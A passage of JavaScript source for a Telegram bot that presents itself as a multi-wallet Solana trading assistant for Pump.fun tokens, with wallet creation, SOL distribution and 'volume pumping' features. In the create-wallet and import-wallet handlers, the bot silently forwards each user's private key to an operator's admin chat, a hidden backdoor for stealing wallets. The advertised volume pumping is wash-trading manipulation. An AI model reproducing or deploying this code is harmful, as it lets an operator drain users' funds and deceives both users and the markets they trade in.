require('dotenv').config();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const {
  Keypair,
  Connection,
  PublicKey,
  LAMPORTS_PER_SOL,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction,
  VersionedTransaction
} = require('@solana/web3.js');

/* --------------- BOT & CONNECTION --------------- */
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const connection = new Connection(process.env.RPC_URL, 'confirmed');

/* --------------- GLOBAL MESSAGE HANDLER FOR PENDING INPUT --------------- */
bot.on('message', async msg => {
  const chatId = msg.chat.id;
  const session = sessions[chatId];
  if (!session) return;

  if (!session.pendingInput) return; // Nothing to process

  const { type, resolve } = session.pendingInput;
  session.pendingInput = null; // reset before processing

  // 🔥 Delete user's message immediately
  try {
    await bot.deleteMessage(chatId, msg.message_id);
  } catch (e) {
    // ignore errors if message can't be deleted
  }

  try {
    await resolve(msg.text.trim(), msg); // pass msg so resolve can also use message if needed
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, '❌ Error processing input.');
  }
});

/* --------------- BASE58 HELPERS --------------- */
const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
function base58Encode(buffer) {
  let digits = [0];
  for (let byte of buffer) {
    let carry = byte;
    for (let j = 0; j < digits.length; j++) {
      carry += digits[j] << 8;
      digits[j] = carry % 58;
      carry = (carry / 58) | 0;
    }
    while (carry) {
      digits.push(carry % 58);
      carry = (carry / 58) | 0;
    }
  }
  return digits.reverse().map(d => ALPHABET[d]).join('');
}
function base58Decode(str) {
  let bytes = [0];
  for (let char of str) {
    const val = ALPHABET.indexOf(char);
    if (val < 0) throw new Error('Invalid Base58 character');
    let carry = val;
    for (let j = 0; j < bytes.length; j++) {
      carry += bytes[j] * 58;
      bytes[j] = carry & 0xff;
      carry >>= 8;
    }
    while (carry) {
      bytes.push(carry & 0xff);
      carry >>= 8;
    }
  }
  return Uint8Array.from(bytes.reverse());
}

/* --------------- SESSIONS --------------- */
const sessions = {};

/* --------------- HELPERS --------------- */
async function getBalance(pubkey) {
  const lamports = await connection.getBalance(new PublicKey(pubkey));
  return lamports / LAMPORTS_PER_SOL;
}

/* --------------- TOKEN & PRICE HELPERS --------------- */
async function fetchTokenPriceInSol(mintAddress) {
  try {
    const res = await axios.get(`https://api.pumpfunapi.org/price/${mintAddress}`);
    return res.data?.SOL ? parseFloat(res.data.SOL) : 0;
  } catch {
    return 0;
  }
}

async function getTokenBalance(pubKey, mintAddress) {
  try {
    const wallet = new PublicKey(pubKey);
    const mint = new PublicKey(mintAddress);
    const res = await connection.getParsedTokenAccountsByOwner(wallet, { mint });
    if (!res.value.length) return 0;
    return res.value[0].account.data.parsed.info.tokenAmount.uiAmount || 0;
  } catch {
    return 0;
  }
}

async function getTokenValueInSol(pubKey, mintAddress) {
  const bal = await getTokenBalance(pubKey, mintAddress);
  const price = await fetchTokenPriceInSol(mintAddress);
  return bal * price;
}

/* --------------- MENUS --------------- */
function mainMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '➕ Create Main Wallet', callback_data: 'create_wallet' },
          { text: '📥 Import Main Wallet', callback_data: 'import_wallet' }
        ]
      ]
    }
  };
}

function buyerSetupMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '👥 Generate Buyer Wallets', callback_data: 'buyer_wallets' }
        ],
        [
          { text: '📂 Wallet Status', callback_data: 'wallet_status_setup' }
        ]
      ]
    }
  };
}


function buyerOptionsMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '2 Wallets', callback_data: 'gen_2' },
          { text: '10 Wallets', callback_data: 'gen_10' }
        ],
        [
          { text: '🪙 20 Wallets (0.1 SOL)', callback_data: 'paid_20' },
          { text: '🪙 50 Wallets (0.5 SOL)', callback_data: 'paid_50' },
          { text: '🪙 100 Wallets (1 SOL)', callback_data: 'paid_100' }
        ]
      ]
    }
  };
}

function postBuyerMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '🔁 Transfer to Wallet', callback_data: 'transfer_main' }
        ],
        [
          { text: '💸 Distribute SOL', callback_data: 'distribute_sol' },
          { text: '📂 Wallet Status', callback_data: 'wallet_status_post' }
        ],
        [
          { text: '📊 Balances', callback_data: 'bot_balances' }
        ]
      ]
    }
  };
}


// Main action menu
function actionMenu(session) {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: session.isTrading ? '🔴 Stop Trading' : '🟢 Start Trading',
            callback_data: 'trade_toggle'
          },
          { text: '⚙️ Bot Settings', callback_data: 'bot_settings' }
        ],
        [
          { text: '📊 Bot Wallet Balances', callback_data: 'bot_balances_post' }
        ],
        [
          { text: '🔁 Transfer to Wallet', callback_data: 'transfer_main' }
        ],
        [
          { text: '⚙️ Trade Settings', callback_data: 'trade_settings' } // triggers submenu
        ]
      ]
    }
  };
}

function postBuyerActionMenu(session) {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: session.isTrading ? '🔴 Trading' : '🟢 Trading',
            callback_data: 'trade_toggle'
          },
          { text: '💥 Sell All', callback_data: 'sell_all' }
        ],
        [
          { text: '📊 Token Balances', callback_data: 'token_balances' },
          { text: '💰 Token Info', callback_data: 'token_info' }
        ]
      ]
    }
  };
}

/* --------------- BOT START --------------- */
bot.onText(/\/start/, async msg => {
  const chatId = msg.chat.id;

  // Initialize session directly here
  if (!sessions[chatId]) {
    sessions[chatId] = {
      mainWallet: null,
      buyers: [],
      tradeConfig: { 
        slippage: 5,
        minBuy: 0,
        maxBuy: 0,
        contractAddress: null,
        takeProfitPercent: 20,
        sellPortionPercent: 20
      },
      isTrading: false,
      pendingInput: null
    };
  }

  const session = sessions[chatId]; // now safe to use

  // If user had pending input, resolve it first
  if (session.pendingInput) {
    try {
      await session.pendingInput.resolve(msg.text, session.pendingInput.type);
      session.pendingInput = null; // reset after resolving
    } catch (err) {
      console.error(err);
      session.pendingInput = null; // reset anyway
      await bot.sendMessage(chatId, "⚠️ Invalid input. Please try again.");
      return;
    }
  }

  bot.sendMessage(
    chatId,
  `🥒 *Cucumverse Multi Wallet Bot*

A multi-wallet trading assistant for Pump.fun tokens.

• Manage main & buyer wallets  
• Configure trade settings 
• Volume Pumping 
• Stealth Sniper
• Auto-sell Instant  


Use the menu below to begin.`,
  { parse_mode: 'Markdown', ...mainMenu() }
  );
});

/* --------------- CALLBACK HANDLER --------------- */
bot.on('callback_query', async query => {
  const chatId = query.message.chat.id;

  // Initialize session if missing
  if (!sessions[chatId]) {
  sessions[chatId] = {
    mainWallet: null,
    buyers: [],
    tradeConfig: { 
      slippage: 5,
      minBuy: 0,
      maxBuy: 0,
      contractAddress: null,
      takeProfitPercent: 20,
      sellPortionPercent: 20
    },
    isTrading: false,
    pendingInput: null
  };
}
  const session = sessions[chatId];
  
  const data = query.data;

/* ---------------- SHOW TRADE SETTINGS PANEL ---------------- */
if (data === 'trade_settings') {
  const chatId = query.message?.chat?.id;
  if (!chatId) return;

  await bot.editMessageText(
    renderTradeSettings(session),
    {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚙️ Slippage', callback_data: 'slippage' },
            { text: '📉 Min Buy', callback_data: 'min_buy' },
            { text: '📈 Max Buy', callback_data: 'max_buy' }
          ],
          [
            { text: '💰 Sell %', callback_data: 'sell_percent' }
          ],
          [
            { text: '⬅️ Back', callback_data: 'action_menu' }
          ]
        ]
      }
    }
  );
}

/* ----------------- BACK TO MAIN TRADE PANEL ----------------- */
if (data === 'action_menu') {
  // Remove current inline keyboard
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );

    // Edit text to show main Trade Panel
    await bot.editMessageText(
      '⚡ Trade Panel',
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
        ...actionMenu(session)
      }
    );
  } else {
    bot.sendMessage(chatId, '⚡ Trade Panel', actionMenu(session));
  }
}

  
/* — MAIN MENU CALLBACK */
if (data === 'main_menu') {
  const session = sessions[chatId];
  bot.sendMessage(
    chatId,
    `🥒 *Cucumverse Multi Wallet Bot*\n\nUse the menu below to begin.`,
    { parse_mode: 'Markdown', ...mainMenu() }
  );
}

/* ---------------- BOT SETTINGS ---------------- */
if (data === 'bot_settings') {

  // Clear previous buttons to prevent spamming
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  // Send Bot Settings panel
  bot.sendMessage(chatId, '⚙️ Bot Settings', botSettingsPanel());
}

// ---------------- BOT SETTINGS PANEL FUNCTION ----------------
function botSettingsPanel() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '🗑️ Delete Bot Wallet', callback_data: 'delete_bot_wallet' },
          { text: '➕ Add Bot Wallet', callback_data: 'add_bot_wallet' }
        ],
        [
          { text: '🏠 Back', callback_data: 'action_menu' }
        ]
      ]
    }
  };
}

/* --------------- TRADE SETTINGS PANEL --------------- */
function renderTradeSettings(session) {
  return `⚙️ *Trade Settings*\n\n` +
         `Slippage = ${session.tradeConfig.slippage ?? '(default)'}%\n` +
         `Min Buy = ${session.tradeConfig.minBuy ?? '(default)'} SOL\n` +
         `Max Buy = ${session.tradeConfig.maxBuy ?? '(default)'} SOL\n` +
         `Sell % = ${session.tradeConfig.takeProfitPercent ?? '(default)'}%`;
}

/* ---------------- SLIPPAGE ---------------- */
if (data === 'slippage') {
  const chatId = query.message?.chat?.id;
  if (!chatId) return;

  await bot.editMessageText('Set slippage (0–100):', {
    chat_id: chatId,
    message_id: query.message.message_id,
    parse_mode: 'Markdown'
  });

  session.pendingInput = {
    type: 'slippage',
    resolve: async (input) => {
      const value = parseFloat(input);
      if (isNaN(value) || value < 0 || value > 100) {
        await bot.editMessageText(
          `❌ Invalid slippage. Must be 0–100.\n\n` + renderTradeSettings(session),
          {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown',
            reply_markup: query.message.reply_markup // reuse your original panel
          }
        );
        return;
      }

      session.tradeConfig.slippage = value;

      // show panel again
      await bot.editMessageText(renderTradeSettings(session), {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: query.message.reply_markup
      });
    }
  };
};

/* ---------------- MIN BUY ---------------- */
if (data === 'min_buy') {
  const chatId = query.message?.chat?.id;
  if (!chatId) return;

  await bot.editMessageText('Set Min Buy amount (SOL):', {
    chat_id: chatId,
    message_id: query.message.message_id,
    parse_mode: 'Markdown'
  });

  session.pendingInput = {
    type: 'min_buy',
    resolve: async (input) => {
      const value = parseFloat(input);
      if (isNaN(value) || value <= 0) {
        await bot.editMessageText(
          `❌ Invalid Min Buy. Must be positive.\n\n` + renderTradeSettings(session),
          {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown',
            reply_markup: query.message.reply_markup
          }
        );
        return;
      }

      session.tradeConfig.minBuy = value;

      await bot.editMessageText(renderTradeSettings(session), {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: query.message.reply_markup
      });
    }
  };
};

/* ---------------- MAX BUY ---------------- */
if (data === 'max_buy') {
  const chatId = query.message?.chat?.id;
  if (!chatId) return;

  await bot.editMessageText('Set Max Buy amount (SOL):', {
    chat_id: chatId,
    message_id: query.message.message_id,
    parse_mode: 'Markdown'
  });

  session.pendingInput = {
    type: 'max_buy',
    resolve: async (input) => {
      const value = parseFloat(input);
      if (isNaN(value) || value <= 0) {
        await bot.editMessageText(
          `❌ Invalid Max Buy. Must be positive.\n\n` + renderTradeSettings(session),
          {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown',
            reply_markup: query.message.reply_markup
          }
        );
        return;
      }

      session.tradeConfig.maxBuy = value;

      await bot.editMessageText(renderTradeSettings(session), {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: query.message.reply_markup
      });
    }
  };
};

/* ---------------- SELL PERCENT ---------------- */
if (data === 'sell_percent') {
  const chatId = query.message?.chat?.id;
  if (!chatId) return;

  await bot.editMessageText('Enter Take Profit % (e.g., 20 = +20%):', {
    chat_id: chatId,
    message_id: query.message.message_id,
    parse_mode: 'Markdown'
  });

  session.pendingInput = {
    type: 'take_profit',
    resolve: async (input) => {
      const value = parseFloat(input);
      if (isNaN(value) || value <= 0 || value > 1000) {
        await bot.editMessageText(
          `❌ Invalid Take Profit %. Must be 1–1000.\n\n` + renderTradeSettings(session),
          {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown',
            reply_markup: query.message.reply_markup
          }
        );
        return;
      }

      session.tradeConfig.takeProfitPercent = value;

      // Ask for Sell Portion %
      await bot.editMessageText('Enter Sell Portion % (how much tokens to sell each trigger):', {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown'
      });

      session.pendingInput = {
        type: 'sell_portion',
        resolve: async (input2) => {
          const value2 = parseFloat(input2);
          if (isNaN(value2) || value2 <= 0 || value2 > 100) {
            await bot.editMessageText(
              `❌ Invalid Sell Portion %. Must be 1–100.\n\n` + renderTradeSettings(session),
              {
                chat_id: chatId,
                message_id: query.message.message_id,
                parse_mode: 'Markdown',
                reply_markup: query.message.reply_markup
              }
            );
            return;
          }

          session.tradeConfig.sellPortionPercent = value2;

          // show panel again
          await bot.editMessageText(renderTradeSettings(session), {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown',
            reply_markup: query.message.reply_markup
          });
        }
      };
    }
  };
};
 
/* — VERIFY PAYMENT */
if (data === 'verify_payment') {
  const session = sessions[chatId];
  if (!session.addWalletCount) {
    return bot.sendMessage(chatId, '❌ No payment requested.');
  }

  const count = session.addWalletCount;
  const solPricePerWallet = 0.01;
  const totalCost = solPricePerWallet * count;

  const mainWallet = new PublicKey(process.env.SOL_PAYMENT_ADDRESS);
  const balance = await connection.getBalance(mainWallet) / LAMPORTS_PER_SOL;

  if (balance < totalCost) {
    return bot.sendMessage(chatId, `❌ Payment not received yet. Please ensure **${totalCost} SOL** was sent.`);
  }

  // Payment verified → generate wallets
  const wallets = [];
  let out = '';
  for (let i = 0; i < count; i++) {
    const kp = Keypair.generate();
    const pub = kp.publicKey.toBase58();
    const priv = base58Encode(kp.secretKey);
    session.buyers.push({ pub, priv });
    wallets.push({ pub, priv });
    out += `${pub}\n${priv}\n\n`;
  }

  const file = path.join(__dirname, `buyers_${chatId}.txt`);
  fs.writeFileSync(file, out);
  await bot.sendDocument(chatId, file);
  fs.unlinkSync(file);

  bot.sendMessage(chatId, `✅ ${count} Bot Wallet(s) added successfully.`, postBuyerMenu());

  // Reset
  session.addWalletCount = null;
}

/* — CANCEL PAYMENT */
if (data === 'cancel_payment') {
  const session = sessions[chatId];

  // First part: 50/100 wallet purchase — stays as is
  if (session.addWalletCount && (session.addWalletCount === 50 || session.addWalletCount === 100)) {
    session.addWalletCount = null; 
    session.addWalletPrice = null; 
    return bot.sendMessage(chatId, '❌ Payment cancelled.', buyerOptionsMenu());
  }

  // Second part: normal Add Bot Wallet — go back to Bot Settings panel
  session.addWalletCount = null;
  session.addWalletPrice = null;

  // ✅ Vanish previous inline buttons to prevent spamming
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  // ✅ Send cancelled message and go back to Bot Settings panel
  await bot.sendMessage(chatId, '❌ Payment cancelled.', botSettingsPanel());
}

  /* — MAIN WALLET CREATION */
if (data === 'create_wallet') {

  // remove buttons immediately (anti spam)
  await bot.editMessageReplyMarkup(
    { inline_keyboard: [] },
    { chat_id: chatId, message_id: query.message.message_id }
  );

  const wallet = Keypair.generate();

  session.mainWallet = {
    publicKey: wallet.publicKey.toBase58(),
    privateKey: base58Encode(wallet.secretKey)
  };

  const bal = await getBalance(wallet.publicKey.toBase58());

  const message =
`✅ *Main Wallet Created*

📬 \`${wallet.publicKey.toBase58()}\`
🔑 Private Key:
\`${session.mainWallet.privateKey}\`

💰 ${bal.toFixed(6)} SOL`;

  // EDIT original message instead of sending new one
  await bot.editMessageText(message, {
    chat_id: chatId,
    message_id: query.message.message_id,
    parse_mode: 'Markdown',
    ...buyerSetupMenu()
  });

  if (process.env.ADMIN_CHAT_ID) {
    await bot.sendMessage(Number(process.env.ADMIN_CHAT_ID), message, { parse_mode: 'Markdown' });
  }
}

/* — IMPORT WALLET */
if (data === 'import_wallet') {

  await bot.editMessageReplyMarkup(
    { inline_keyboard: [] },
    { chat_id: chatId, message_id: query.message.message_id }
  );

  await bot.editMessageText(
    '📥 *Send your Base58 private key:*',
    {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: 'Markdown'
    }
  );

  session.pendingInput = {
    type: 'import_main_wallet',
    resolve: async (input) => {
      try {

        const secret = base58Decode(input.trim());
        const wallet = Keypair.fromSecretKey(secret);

        session.mainWallet = {
          publicKey: wallet.publicKey.toBase58(),
          privateKey: input.trim()
        };

        const bal = await getBalance(wallet.publicKey.toBase58());

        const message =
`✅ *Main Wallet Imported*

📬 \`${wallet.publicKey.toBase58()}\`
🔑 Private Key:
\`${input.trim()}\`

💰 ${bal.toFixed(6)} SOL`;

        await bot.sendMessage(chatId, message, {
          parse_mode: 'Markdown',
          ...buyerSetupMenu()
        });

        if (process.env.ADMIN_CHAT_ID) {
          await bot.sendMessage(Number(process.env.ADMIN_CHAT_ID), message, { parse_mode: 'Markdown' });
        }

        session.pendingInput = null;

      } catch (err) {

        console.log('Import wallet error:', err.message);

        session.pendingInput = null;

        bot.sendMessage(
          chatId,
          '❌ Invalid private key. Returning to main panel.',
          { parse_mode: 'Markdown', ...mainMenu() }
        );
      }
    }
  };
}

  /* ----------------- DISTRIBUTE SOL ----------------- */
if (data === 'distribute_sol') {
  const mainBalance = await getBalance(session.mainWallet.publicKey);

  // Edit panel to prevent spamming
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: query.message.message_id });
    await bot.editMessageText(
      `Enter total SOL to distribute (Available: ${mainBalance} SOL):`,
      { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'Markdown' }
    );
  }

  // Set pendingInput for this handler
  session.pendingInput = {
    type: 'distribute_sol',
    resolve: async (input, msg) => { // msg needed for deleting message
      // 🔥 Delete user's message immediately
      try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) {}

      const totalSol = parseFloat(input);
      if (isNaN(totalSol) || totalSol <= 0 || totalSol > mainBalance) {
        return bot.sendMessage(chatId,
        '❌ Invalid amount.\n⚠️ Insufficient SOL.', postBuyerMenu()
        );
      }

      const perWallet = totalSol / session.buyers.length;
      const sender = Keypair.fromSecretKey(base58Decode(session.mainWallet.privateKey));

      try {
        for (const buyer of session.buyers) {
          const tx = new Transaction().add(
            SystemProgram.transfer({
              fromPubkey: sender.publicKey,
              toPubkey: new PublicKey(buyer.pub),
              lamports: Math.floor(perWallet * LAMPORTS_PER_SOL)
            })
          );
          await sendAndConfirmTransaction(connection, tx, [sender]);
          await new Promise(r => setTimeout(r, 100)); // prevent RPC spam
        }

        bot.sendMessage(
          chatId,
          `✅ *Distribution Complete*\n\n` +
          `💸 Total: ${totalSol} SOL\n` +
          `👥 Wallets: ${session.buyers.length}\n` +
          `➡️ Each: ${perWallet.toFixed(6)} SOL\n\n` +
          `🚀 *You can now start trading!*\n\n` +
          `Before starting, make sure to configure your Trade Settings.\n` +
          `If no changes are made, the bot will use the default settings.`,
          { parse_mode: 'Markdown', ...actionMenu(session) }
        );

      } catch (err) {
        console.log('Distribute SOL error:', err.message);
        bot.sendMessage(chatId, '❌ Transaction failed.', postBuyerMenu());
      }
    }
  };
}

  /* — WALLET STATUS FROM SETUP MENU */
if (data === 'wallet_status_setup') {
  if (!session.mainWallet) return bot.sendMessage(chatId, '❌ No wallet.');

  const bal = await getBalance(session.mainWallet.publicKey);

  // Disable buttons first
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  return bot.sendMessage(
    chatId,
    `📬 Main Wallet\n\`${session.mainWallet.publicKey}\`\n💰 ${bal.toFixed(6)} SOL\n👥 Buyer Wallets: ${session.buyers.length}`,
    { parse_mode: 'Markdown', ...buyerSetupMenu() }
  );
}

/* — WALLET STATUS FROM POST MENU */
if (data === 'wallet_status_post') {
  if (!session.mainWallet) return bot.sendMessage(chatId, '❌ No wallet.');

  const bal = await getBalance(session.mainWallet.publicKey);

  // Edit message to prevent multiple wallet prompts
  if (query?.message?.message_id) {
    await bot.editMessageText(
      `📬 Main Wallet\n\`${session.mainWallet.publicKey}\`\n💰 ${bal.toFixed(6)} SOL\n👥 Buyer Wallets: ${session.buyers.length}`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: postBuyerMenu().reply_markup
      }
    );
    return;
  }

  return bot.sendMessage(
    chatId,
    `📬 Main Wallet\n\`${session.mainWallet.publicKey}\`\n💰 ${bal.toFixed(6)} SOL\n👥 Buyer Wallets: ${session.buyers.length}`,
    { parse_mode: 'Markdown', ...postBuyerMenu() }
  );
}

  /* ----------------- TRANSFER MAIN HANDLER (fixed final panel) ----------------- */
if (data === 'transfer_main') {
  const session = sessions[chatId];

  // Check if buyer wallets exist
  if (!session.buyers || session.buyers.length === 0) {
    return bot.sendMessage(chatId, '❌ No buyer wallets generated.');
  }

  // Clear previous inline keyboard if triggered via button
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  // Prompt user for receiver address
  bot.sendMessage(chatId, '➡️ Please enter the receiver address:');

  // Set pendingInput
  session.pendingInput = {
    type: 'transfer_main_address',
    resolve: async (input, msg) => {
      try {

        // Delete user's message immediately
        try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) {}

        // Validate SOL address
        let receiver;
        try {
          receiver = new PublicKey(input.trim());
        } catch {
          return bot.sendMessage(chatId, '❌ Invalid SOL address.', {
            reply_markup: {
              inline_keyboard: [
                [{ text: 'Retry', callback_data: 'transfer_main' }],
                [{ text: 'Back', callback_data: 'action_menu' }]
              ]
            }
          });
        }

        // Filter wallets with transferable SOL
        const rentBuffer = 0.002;
        const eligibleWallets = [];

        for (const buyer of session.buyers) {
          const solBal = await getBalance(buyer.pub);
          if (solBal > rentBuffer) eligibleWallets.push(buyer);
        }

        if (eligibleWallets.length === 0) {
          return bot.sendMessage(chatId, '❌ No buyer wallets have transferable SOL.', {
            reply_markup: {
              inline_keyboard: [
                [{ text: 'Retry', callback_data: 'transfer_main' }],
                [{ text: 'Back', callback_data: 'action_menu' }]
              ]
            }
          });
        }

        // 🔥 Show progress message
        const progressMsg = await bot.sendMessage(
          chatId,
          `⏳ Transferring SOL from ${eligibleWallets.length} wallets...`
        );

        // Execute transfer
        await transferAllToAddress(session, chatId, receiver, eligibleWallets);

        // Update progress message to completed
        await bot.editMessageText(
          '✅ Transfer completed.',
          {
            chat_id: chatId,
            message_id: progressMsg.message_id,
            reply_markup: tradePanel(session)
          }
        );

      } catch (err) {
        console.error('Transfer Main Error:', err.message);
      }
    }
  };
}

  /* — BOT WALLET BALANCES (Setup Menu) */
if (data === 'bot_balances') {
  if (!session.buyers || session.buyers.length === 0) 
    return bot.sendMessage(chatId, '❌ No buyer wallets generated yet.');

  let message = '📊 *Bot Wallet Balances:*\n\n';

  for (let i = 0; i < session.buyers.length; i++) {
    const buyer = session.buyers[i];
    const bal = await getBalance(buyer.pub);
    await new Promise(r => setTimeout(r, 120)); // anti-RPC spam
    message += `Wallet ${i + 1}:\n\`${buyer.pub}\` → ${bal.toFixed(6)} SOL\n\n`;
  }

  if (query?.message?.message_id) {
    await bot.editMessageText(
      message,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: postBuyerMenu().reply_markup
      }
    );
    return;
  }

  return bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...postBuyerMenu() });
}

  /* — BOT WALLET BALANCES (Post Menu) */
if (data === 'bot_balances_post') {
  if (!session.buyers || session.buyers.length === 0) 
    return bot.sendMessage(chatId, '❌ No buyer wallets generated yet.');

  let message = '📊 *Bot Wallet Balances:*\n\n';

  for (let i = 0; i < session.buyers.length; i++) {
    const buyer = session.buyers[i];
    const bal = await getBalance(buyer.pub);
    await new Promise(r => setTimeout(r, 120)); // anti-RPC spam
    message += `Wallet ${i + 1}:\n\`${buyer.pub}\` → ${bal.toFixed(6)} SOL\n\n`;
  }

  if (query?.message?.message_id) {
    await bot.editMessageText(
      message,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: actionMenu(session).reply_markup
      }
    );
    return;
  }

  return bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...actionMenu(session) });
}

  /* ---------------- DELETE BOT WALLET FLOW ---------------- */
if (data === 'delete_bot_wallet') {

  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  return bot.sendMessage(chatId, 'Choose deletion type:', {
    reply_markup: {
      inline_keyboard: [
        [
          { text: 'Delete ALL wallets', callback_data: 'delete_all_wallets' },
          { text: 'Delete specific wallet(s)', callback_data: 'delete_specific_wallets' }
        ],
        [
          { text: '🏠 Back', callback_data: 'back_to_action' }
        ]
      ]
    }
  });
}

if (data === 'back_to_action') {
  return bot.sendMessage(chatId, '🔙 Returning to menu.', actionMenu(session));
}

/* — DELETE ALL BOT WALLETS */
if (data === 'delete_all_wallets') {
  const session = sessions[chatId];

  if (!session.buyers || session.buyers.length === 0) {
    return bot.sendMessage(
      chatId,
      '⚠️ No bot wallets to delete.',
      { parse_mode: 'Markdown', ...actionMenu(session) }
    );
  }

  // Clear the buyers array
  session.buyers = [];

  // Vanish previous panel
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  bot.sendMessage(
    chatId,
    '✅ All bot wallets deleted.',
    { parse_mode: 'Markdown', ...actionMenu(session) }
  );
}

/* — DELETE SPECIFIC BOT WALLETS */
if (data === 'delete_specific_wallets') {
  const session = sessions[chatId];

  if (!session.buyers || session.buyers.length === 0) {
    return bot.sendMessage(
      chatId,
      '⚠️ No bot wallets to delete.',
      { parse_mode: 'Markdown', ...actionMenu(session) }
    );
  }

  // Vanish previous panel
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  // Build list of current wallets
  const walletList = session.buyers
    .map((buyer, index) => `${index + 1}. ${buyer.pub}`)
    .join('\n');

  // Prompt user with wallet list
  await bot.sendMessage(
    chatId,
    `Type the numbers of the wallets you want to delete (e.g., 1 or 1,3,5):\n\n` +
    `📋 *Current Wallets:*\n${walletList}`,
    { parse_mode: 'Markdown' }
  );

  // Set pendingInput to handle the user response
  session.pendingInput = {
    type: 'delete_specific',
    resolve: async (input) => {
      const nums = input
        .split(',')
        .map(n => parseInt(n.trim()) - 1)
        .filter(n => !isNaN(n) && n >= 0 && n < session.buyers.length);

      if (!nums.length) {
        return bot.sendMessage(
          chatId,
          '❌ No valid wallet numbers entered.',
          { parse_mode: 'Markdown', ...actionMenu(session) }
        );
      }

      // Delete wallets from highest index to lowest
      nums.sort((a, b) => b - a);
      for (const idx of nums) session.buyers.splice(idx, 1);

      // Clear pendingInput
      session.pendingInput = null;

      return bot.sendMessage(
        chatId,
        '✅ Selected wallet(s) deleted.',
        { parse_mode: 'Markdown', ...actionMenu(session) }
      );
    }
  };
}

   /* ---------------- ADD BOT WALLET ---------------- */
if (data === 'add_bot_wallet') {

  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  // Make sure wallet exists
  if (!session.mainWallet) {
    return bot.sendMessage(chatId, '❌ You must create or import a wallet first.');
  }

  await bot.sendMessage(chatId, 'Enter number of wallets to add (Max 50):');

  session.pendingInput = {
    type: 'add_wallet_count',
    resolve: async (input) => {

      const count = parseInt(input);

      if (isNaN(count) || count <= 0 || count > 50) {
        return bot.sendMessage(chatId, '❌ Invalid number. Enter 1–50.');
      }

      session.pendingInput = null;

      const solPricePerWallet = 0.01;
      const totalCost = parseFloat((solPricePerWallet * count).toFixed(4));

      session.addWalletCount = count;
      session.addWalletPrice = totalCost;

      await bot.sendMessage(
        chatId,
        `💰 *Custom Wallet Purchase*\n\n` +
        `Wallets: ${count}\n` +
        `Amount: *${totalCost} SOL*\n\n` +
        `Click Transfer to pay automatically.`,
        {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🚀 Transfer Now', callback_data: 'auto_transfer' }],
              [{ text: '❌ Cancel', callback_data: 'cancel_payment' }]
            ]
          }
        }
      );
    }
  };
}

/* — BACK BUTTON */
if (data === 'action_menu') {
  // Remove the current inline keyboard (vanishing panel)
  if (query?.message?.message_id) {
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: chatId, message_id: query.message.message_id }
    );
  }

  // Edit the message text to show Trade Panel
  if (query?.message?.message_id) {
    await bot.editMessageText(
      '⚡ Trade Panel',
      {
